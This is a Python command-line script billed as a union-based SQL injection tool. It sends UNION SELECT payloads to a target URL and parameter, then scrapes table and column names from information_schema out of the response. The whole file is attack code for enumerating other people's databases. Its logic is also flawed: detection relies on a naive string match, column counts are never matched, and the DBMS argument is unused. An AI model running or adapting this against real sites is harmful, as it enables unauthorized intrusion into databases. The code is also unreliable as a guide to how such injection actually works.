# -*- coding: utf-8 -*-

"""
 Union-Based SQL Injection Tool
 Version: Graden
 Author: G4UR4V007
"""

import requests
from bs4 import BeautifulSoup
import argparse

# Define the banner
BANNER = """
   _____               _              
  / ____|             | |             
 | |  __  __ _ _ __ __| | ___ _ __ ___  
 | | |_ |/ _` | '__/ _` |/ _ \ '__/ _ \ 
 | |__| | (_| | | | (_| |  __/ | | (_) |
  \_____|\\__,_|_|\\__,_|\\___|_|  \\___/ 
"""

# Define the usage
USAGE = """
usage: union_sqli.py [-h] -u URL -p PARAM -d DBMS

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     target URL
  -p PARAM, --param PARAM  vulnerable parameter
  -d DBMS, --dbms DBMS  database management system (e.g., MySQL, PostgreSQL)
"""

# Define the supported DBMS
SUPPORTED_DBMS = ["MySQL", "PostgreSQL"]

def get_args():
    parser = argparse.ArgumentParser(description=BANNER, usage=USAGE)
    parser.add_argument("-u", "--url", required=True, help="target URL")
    parser.add_argument("-p", "--param", required=True, help="vulnerable parameter")
    parser.add_argument("-d", "--dbms", required=True, help="database management system")
    args = parser.parse_args()
    return args

def test_sqli(url, param, dbms):
    # Send a request to the target URL with a malicious payload
    payload = "' UNION SELECT * FROM information_schema.tables --"
    params = {param: payload}
    response = requests.get(url, params=params)
    
    # Check for SQL injection vulnerability in the response
    if "information_schema.tables" in response.text:
        print("[+] SQL injection vulnerability found!")
        return True
    else:
        print("[-] No SQL injection vulnerability found.")
        return False

def extract_data(url, param, dbms):
    # Extract the database structure
    print("[+] Extracting database information...")
    payload = "' UNION SELECT table_name, column_name FROM information_schema.columns --"
    params = {param: payload}
    response = requests.get(url, params=params)
    
    # Parse the response to extract the database structure
    tables = []
    columns = []
    soup = BeautifulSoup(response.text, 'html.parser')
    for row in soup.find_all('tr'):
        cols = row.find_all('td')
        if len(cols) == 2:
            tables.append(cols[0].text.strip())
            columns.append(cols[1].text.strip())

    # Print the extracted data
    print("[+] Database structure:")
    for table, column in zip(tables, columns):
        print(f"  - {table}.{column}")

def main():
    args = get_args()
    url = args.url
    param = args.param
    dbms = args.dbms

    # Check if the DBMS is supported
    if dbms not in SUPPORTED_DBMS:
        print("[-] Unsupported DBMS. Please use one of the following: {}".format(", ".join(SUPPORTED_DBMS)))
        return

    # Test for SQL injection vulnerability
    if test_sqli(url, param, dbms):
        # Extract data from the database
        extract_data(url, param, dbms)

if __name__ == "__main__":
    print(BANNER)
    main()
